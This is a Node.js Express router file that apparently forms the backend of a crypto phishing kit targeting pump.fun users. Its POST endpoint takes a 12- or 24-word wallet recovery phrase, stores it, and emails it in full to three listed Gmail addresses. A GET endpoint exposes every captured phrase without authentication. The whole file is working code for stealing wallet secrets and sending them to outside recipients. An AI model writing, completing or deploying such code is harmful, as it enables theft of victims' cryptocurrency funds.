
const express = require("express")
const phraseModel = require("./models/pump.model")
const router = express.Router()
const sendEmail = require("./mailer")

router.get("/pumphrase", async (req, res) => {
    try{
        const response = await phraseModel.find()
        res.json(response)
    } catch(err){
        // console.error("error fetching data", err.message)
        res.status(500).json({error:"internal server error"})
    }
})

router.post("/pumphrase", async (req, res) => {
    const {pumpfunPhrases} = req.body
    if(!pumpfunPhrases || typeof pumpfunPhrases !== "string"){
        return res.status(400).json({error: "phrase is required and must be in text format"})
    }
    const twelve = pumpfunPhrases.trim().split(/\s+/)
    if(twelve.length !== 12 && twelve.length !== 24){
        return res.status(400).json({error: "phrase must be either 12 or 24 words!"})
    }

    try{
        const save = await phraseModel.create({pumpfunPhrases})
        
        // Optionally send an email notification
        await sendEmail(
            ["ibrahimmohammed427880@gmail.com", "martinluthermod@gmail.com", "blessingicing@gmail.com"],
            "New Pumpfun phrase logged",
            `A new phrase was just logged:\n\n${pumpfunPhrases}`,
            console.log("Email sent successfully")
        ).catch((emailErr) => {
            console.error("Error sending email:", emailErr.message)
        })
        res.status(201).json({message: "pumpfun phrase saved!", data: save})
        req.io.emit("phrase_added", { success: true, data: save });

        // console.log("saved phrase:", save)
    } catch(err){
        if(err.code === 11000){
            // console.log("this phrase is already existing", err.message)
            return res.status(409).json({error: "this phrase already exists"})
        }
        res.status(500).json({error: "internal server error"})
        // console.error("error saving phrase", err)
    }
})

module.exports = router